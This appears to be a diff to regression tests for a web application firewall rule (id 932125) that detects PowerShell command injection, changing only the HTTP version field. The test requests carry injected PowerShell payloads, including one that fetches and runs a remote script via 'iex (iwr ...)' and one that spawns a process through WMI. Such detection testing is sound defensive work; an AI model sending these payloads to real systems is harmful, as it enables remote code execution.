@@ -17,7 +17,7 @@ tests:
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             uri: "/get?cmd=%3Biwr%20http://example.com/path/file.ps1"
-            protocol: "http"
+            version: "HTTP/1.1"
           output:
             log_contains: id "932125"
   - test_title: 932125-2
@@ -33,7 +33,7 @@ tests:
               Host: "localhost"
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             uri: "/get?cmd=%3Biwmi%20-class%20Win32_process%20-name%20Create%20-ArgumentList%20cmd"
-            protocol: "http"
+            version: "HTTP/1.1"
           output:
             log_contains: id "932125"
   - test_title: 932125-3
@@ -50,6 +50,6 @@ tests:
               Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             uri: "/post"
             data: cmd=;iex (iwr http://10.0.10.10:8000/x.ps1)
-            protocol: "http"
+            version: "HTTP/1.1"
           output:
             log_contains: id "932125"
